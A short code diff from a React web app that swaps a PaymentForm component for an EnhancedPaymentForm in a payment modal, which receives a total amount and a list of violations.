@@ -10,7 +10,7 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { serviceProviders } from "@/lib/service-providers"
-import { PaymentForm } from "@/components/payment-form"
+import { EnhancedPaymentForm } from "@/components/payment-form"
 import { SiteHeader } from "./ui/header"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
@@ -204,8 +204,7 @@ useEffect(()=>{
         </div>
         {showPayment && (
           <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
-            <PaymentForm
-            handleSubmit={()=>{}}
+            <EnhancedPaymentForm
               totalAmount={Number.parseFloat(amount) || 0}
               violations={[
                 {
